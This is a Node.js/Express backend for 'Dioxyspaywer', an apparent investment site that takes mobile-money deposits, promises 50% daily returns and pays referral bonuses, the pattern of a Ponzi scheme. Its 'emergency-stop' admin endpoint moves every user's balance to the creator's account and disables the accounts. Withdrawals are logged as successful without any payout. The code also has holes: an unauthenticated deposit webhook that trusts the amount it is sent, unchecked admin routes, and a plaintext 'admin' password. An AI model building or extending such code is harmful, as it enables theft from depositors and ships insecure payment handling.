require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const cron = require('node-cron');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ Base de données connectée'))
    .catch(err => console.error('❌ Erreur DB:', err));

const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        res.status(401).json({ error: 'Token invalide' });
    }
};

app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const { fullName, phone, country, password, referralCode } = req.body;
    const hashedPassword = await bcrypt.hash(password, 10);
    let role = 'user';
    if (phone === process.env.CREATOR_WALLET_PHONE) role = 'admin';
    let referredByUserId = null;

    if (referralCode && referralCode.trim() !== '') {
        const sponsor = await User.findOne({ referralCode: referralCode.trim() });
        if (sponsor) {
            referredByUserId = sponsor._id;
            sponsor.balance += 350; 
            sponsor.referralCount += 1;
            sponsor.referralEarnings += 350;
            await sponsor.save();
            await Transaction.create({ userId: sponsor._id, type: 'REFERRAL_BONUS', amount: 350, method: 'Parrainage', status: 'SUCCESS', reference: `REF_${Date.now()}` });
        }
    }
    try {
        await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        res.status(400).json({ error: 'Numéro déjà utilisé' });
    }
});

// --- CONNEXION AVEC HISTORIQUE ET SOLDES ---
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const { phone, password } = req.body;
    const user = await User.findOne({ phone });
    if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(400).json({ error: 'Identifiants incorrects' });
    }

    const currentMonth = new Date().toISOString().slice(0, 7);
    if (user.lastPurchaseMonth !== currentMonth) {
        user.monthlyPurchasesCount = 0;
        user.lastPurchaseMonth = currentMonth;
        await user.save();
    }

    const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
    
    // Calcul Solde Retrait
    let withdrawBalance = 0;
    const now = new Date();
    if (user.shortTermProducts && user.shortTermProducts.length > 0) {
        user.shortTermProducts.forEach(prod => {
            const unlockDate = new Date(prod.unlockDate);
            if (unlockDate <= now) {
                const totalGains = prod.dailyGain * 5; 
                withdrawBalance += (prod.amount + totalGains);
            }
        });
    }
    if (user.hasLongTerm && user.longTermStartDate) {
        const startDate = new Date(user.longTermStartDate);
        const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
        if (daysPassed >= 55) withdrawBalance += (700 * 55);
        else if (daysPassed > 0) withdrawBalance += (700 * daysPassed);
    }

    const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);

    res.json({ 
        token, 
        role: user.role, 
        balance: user.balance,
        depositBalance: user.balance,
        withdrawBalance: withdrawBalance,
        hasLongTerm: user.hasLongTerm, 
        fullName: user.fullName,
        monthlyPurchasesCount: user.monthlyPurchasesCount,
        remainingPurchases: 2 - user.monthlyPurchasesCount, 
        shortTermProducts: user.shortTermProducts,
        referralCode: user.referralCode, 
        referralCount: user.referralCount, 
        referralEarnings: user.referralEarnings,
        transactions: transactions
    });
});

app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// --- GAINS AUTOMATIQUES ---
cron.schedule('0 8 * * 1-5', async () => {
    if (!isSiteActive) return;
    const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
    const now = new Date();

    for (let user of users) {
        let totalDailyGain = 0;
        if (user.hasLongTerm) {
            const daysPassed = Math.floor((now - user.longTermStartDate) / (1000 * 60 * 60 * 24));
            if (daysPassed < 55) totalDailyGain += 700;
        }
        const activeShortTerms = [];
        for (let prod of user.shortTermProducts) {
            if (prod.unlockDate > now) {
                totalDailyGain += prod.dailyGain;
                activeShortTerms.push(prod);
            }
        }
        user.shortTermProducts = activeShortTerms;
        if (totalDailyGain > 0) {
            user.balance += totalDailyGain;
            await user.save();
            await Transaction.create({ userId: user._id, type: 'GAIN', amount: totalDailyGain, status: 'SUCCESS', reference: `GAIN_${Date.now()}` });
        }
    }
});

// --- INVESTISSEMENT (MIS À JOUR POUR 4 PRODUITS) ---
app.post('/api/invest', authMiddleware, async (req, res) => {
    const { productType, amount } = req.body;
    const user = req.user;
    
    if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
    if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });

    const currentMonth = new Date().toISOString().slice(0, 7);
    if (user.lastPurchaseMonth !== currentMonth) { user.monthlyPurchasesCount = 0; user.lastPurchaseMonth = currentMonth; }

    if (productType !== 'longterm') {
        if (user.monthlyPurchasesCount >= 2) return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
    }

    user.balance -= amount;
    
    if (productType === 'longterm') {
        if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect.' });
        user.hasLongTerm = true; 
        user.longTermStartDate = new Date();
    } else {
        let dailyGain = 0;
        
        if (productType === 'prod1') {
            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect.' });
            dailyGain = 1000;
        } else if (productType === 'prod2') {
            if (amount !== 3000) return res.status(400).json({ error: 'Prix incorrect.' });
            dailyGain = 1500;
        } else if (productType === 'prod3') {
            if (amount !== 5000) return res.status(400).json({ error: 'Prix incorrect.' });
            dailyGain = 2000; // Nouveau Produit 3
        } else if (productType === 'prod4') {
            if (amount !== 10000) return res.status(400).json({ error: 'Prix incorrect.' });
            dailyGain = 5000; // Nouveau Produit 4
        } else {
            return res.status(400).json({ error: 'Produit inconnu.' });
        }
        
        const unlockDate = new Date(); 
        unlockDate.setDate(unlockDate.getDate() + 5);
        
        user.shortTermProducts.push({ type: productType, amount, dailyGain, startDate: new Date(), unlockDate });
        user.monthlyPurchasesCount += 1;
    }
    
    await user.save();
    await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
    
    res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
});

app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });
    try {
        const user = req.user;
        const invoiceNumber = `DXP_${Date.now()}`;
        const postData = {
            "master_key": process.env.PAYDUNYA_MASTER_KEY,
            "token": process.env.PAYDUNYA_SIGNATURE_TOKEN,
            "callback_url": process.env.PAYDUNYA_CALLBACK_URL,
            "return_url": process.env.PAYDUNYA_RETURN_URL,
            "cancel_url": process.env.PAYDUNYA_CANCEL_URL,
            "invoice_number": invoiceNumber,
            "description": `Dépôt Dioxyspaywer - ${user.fullName}`,
            "total_amount": amount,
            "currency": "XOF",
            "customer": { "first_name": user.fullName.split(' ')[0], "last_name": user.fullName.split(' ').slice(1).join(' '), "phone_number": phone },
            "custom_data": { "user_id": user._id.toString(), "network": network }
        };
        const response = await axios.post('https://paydunya.com/checkout-invoice/v1/invoice', postData, {
            headers: { 'Content-Type': 'application/json', 'PayDunya-Master-Key': process.env.PAYDUNYA_MASTER_KEY, 'PayDunya-Token': process.env.PAYDUNYA_SIGNATURE_TOKEN }
        });
        if (response.data && response.data.response_code === "success") {
            const paymentUrl = response.data.checkout_url;
            await Transaction.create({ userId: user._id, type: 'DEPOSIT', amount: amount, method: network, status: 'PENDING', reference: invoiceNumber });
            res.json({ success: true, message: 'Redirection vers PayDunya...', paymentUrl: paymentUrl });
        } else {
            res.status(400).json({ error: 'Erreur création paiement PayDunya.' });
        }
    } catch (error) {
        console.error(error.response ? error.response.data : error);
        res.status(500).json({ error: 'Erreur connexion PayDunya.' });
    }
});

app.post('/api/webhook/deposit', async (req, res) => {
    const data = req.body;
    if (data.event === "payment_completed" || data.status === "completed") {
        const invoiceNumber = data.invoice_number;
        const amount = parseFloat(data.total_amount);
        const customData = data.custom_data;
        if (customData && customData.user_id) {
            const transaction = await Transaction.findOne({ reference: invoiceNumber }).populate('userId');
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();
                const user = transaction.userId;
                user.balance += amount;
                await user.save();
                console.log(`💰 Dépôt PayDunya confirmé : ${amount} FCFA`);
            }
        }
    }
    res.status(200).send("OK");
});

app.post('/api/withdraw', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body;
    const user = req.user;
    const now = new Date();
    if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
    const dayOfWeek = now.getDay();
    if (dayOfWeek === 0 || dayOfWeek === 6) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });
    const currentHour = now.getHours();
    if (currentHour < 8 || currentHour >= 21) return res.status(403).json({ error: 'Retraits possibles de 08h00 à 21h00.' });
    const todayStr = now.toDateString();
    if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === todayStr) return res.status(403).json({ error: '1 retrait/jour max.' });

    let availableWithdrawBalance = 0;
    if (user.shortTermProducts && user.shortTermProducts.length > 0) {
        user.shortTermProducts.forEach(prod => {
            const unlockDate = new Date(prod.unlockDate);
            if (unlockDate <= now) {
                const totalGains = prod.dailyGain * 5;
                availableWithdrawBalance += (prod.amount + totalGains);
            }
        });
    }
    if (user.hasLongTerm && user.longTermStartDate) {
        const startDate = new Date(user.longTermStartDate);
        const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
        if (daysPassed >= 55) availableWithdrawBalance += (700 * 55);
        else if (daysPassed > 0) availableWithdrawBalance += (700 * daysPassed);
    }

    if (amount > availableWithdrawBalance) return res.status(400).json({ error: `Solde insuffisant dans la section RETRAITE. Disponible: ${availableWithdrawBalance} FCFA` });

    user.balance -= amount;
    user.lastWithdrawDate = now;
    await user.save();
    try {
        await Transaction.create({ userId: user._id, type: 'WITHDRAWAL', amount, method: network, status: 'SUCCESS', reference: `PAYOUT_${Date.now()}` });
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        user.balance += amount; user.lastWithdrawDate = null; await user.save();
        res.status(500).json({ error: 'Échec envoi.' });
    }
});

app.get('/api/admin/dashboard', async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Accès réservé créateur.' });
    const users = await User.find();
    const totalVault = users.reduce((acc, curr) => acc + curr.balance, 0);
    res.json({ users, totalVault });
});

app.post('/api/admin/emergency-stop', async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone });
        if (!creator) creator = await User.create({ fullName: 'Admin', phone: creatorPhone, country: 'Togo', password: 'admin', role: 'admin', balance: 0 });
        const allUsers = await User.find({ _id: { $ne: creator._id } });
        let totalSeized = 0;
        for (let user of allUsers) {
            if (user.balance > 0) {
                totalSeized += user.balance;
                await Transaction.create({ userId: user._id, type: 'ADMIN_SEIZE', amount: user.balance, status: 'SUCCESS', reference: 'STOP_' + Date.now() });
                user.balance = 0; user.isActive = false; await user.save();
            }
        }
        creator.balance += totalSeized; await creator.save();
        res.json({ success: true, message: `Site désactivé. ${totalSeized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer lancé sur le port ${PORT}`));
